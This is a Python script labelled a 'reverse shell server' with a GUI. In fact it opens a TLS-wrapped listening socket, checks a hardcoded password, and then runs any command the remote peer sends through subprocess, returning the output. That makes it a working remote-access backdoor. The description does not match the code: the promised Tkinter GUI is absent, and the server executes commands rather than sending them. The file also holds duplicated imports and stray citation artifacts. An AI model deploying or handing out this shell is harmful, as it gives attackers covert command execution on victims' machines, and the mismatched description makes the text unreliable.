#!/usr/bin/env python3
# Step 1: Creating a socket
# Step 2: Binding the socket and listening
# Step 3: Accepting connection
# Step 4: Sending command to the client
# Step 5: Client to server connection
# Step 6: Completing the client file

"""
Reverse Shell Server with a GUI Interface
-------------------------------------------
This server listens for an incoming reverse connection and provides a simple
GUI (using Tkinter) to send commands and display output.
Includes password-based authentication.
"""

import socket
import threading
import tkinter as tk
from tkinter import scrolledtext
import sys
import os
import socket
import ssl
import subprocess
import argparse

# Authentication configuration
# In a production environment, this should be securely stored (not hardcoded)
PASSWORD = "2020"  # We can change this password for a stronger one

def create_server_context(ca_file, cert_file, key_file):
    """
    Server-side TLS context:
    - Purpose.CLIENT_AUTH enforces client cert verification.
    - load_cert_chain presents our server cert & key.
    - load_verify_locations trusts only our CA.
    - verify_mode=CERT_REQUIRED enforces mutual TLS.
    """
    ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)          # :contentReference[oaicite:3]{index=3}
    ctx.load_cert_chain(certfile=cert_file, keyfile=key_file)         # :contentReference[oaicite:4]{index=4}
    ctx.load_verify_locations(cafile=ca_file)                          # :contentReference[oaicite:5]{index=5}
    ctx.verify_mode = ssl.CERT_REQUIRED                                # :contentReference[oaicite:6]{index=6}
    return ctx

def main():
    p = argparse.ArgumentParser(description="Secure Reverse Shell Server")
    p.add_argument('--host', default='0.0.0.0', help='Bind address')
    p.add_argument('--port', type=int, required=True, help='Port to listen on')
    args = p.parse_args()

    ca = 'certs/ca.crt'
    cert = 'certs/server.crt'
    key = 'certs/server.key'

    context = create_server_context(ca, cert, key)
   
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((args.host, args.port))
    sock.listen(1)
    print(f"[+] Listening on {args.host}:{args.port}")

    while True:
        raw_conn, addr = sock.accept()
        try:
            conn = context.wrap_socket(raw_conn, server_side=True)
            print(f"[+] TLS handshake completed with {addr}")

            # Password prompt inside TLS
            recv_pw = conn.recv(1024).strip().decode()
            if recv_pw != PASSWORD:
                conn.send("AUTH_FAIL".encode('utf-8'))
                print(f"[-] Wrong password from {addr}")
                conn.close()
                continue
            conn.send("AUTH_SUCCESS".encode('utf-8'))
            print(f"[+] Client {addr} authenticated; spawning shell")

            # Reverse shell loop
            while True:
                cmd = conn.recv(4096).decode(errors="ignore").strip()
                if not cmd or cmd.lower() in ('exit', 'quit'):
                    break

                if cmd.startswith('cd '):
                    try:
                        os.chdir(cmd[3:].strip())
                        output = ""
                    except Exception as e:
                        output = f"cd error: {e}\n"
                else:
                    output = subprocess.getoutput(cmd) + "\n"

                output += os.getcwd() + "> "
                conn.sendall(output.encode())

        except Exception as e:
            print(f"[-] Connection error: {e}")
        finally:
            conn.close()

if __name__ == '__main__':
    main()
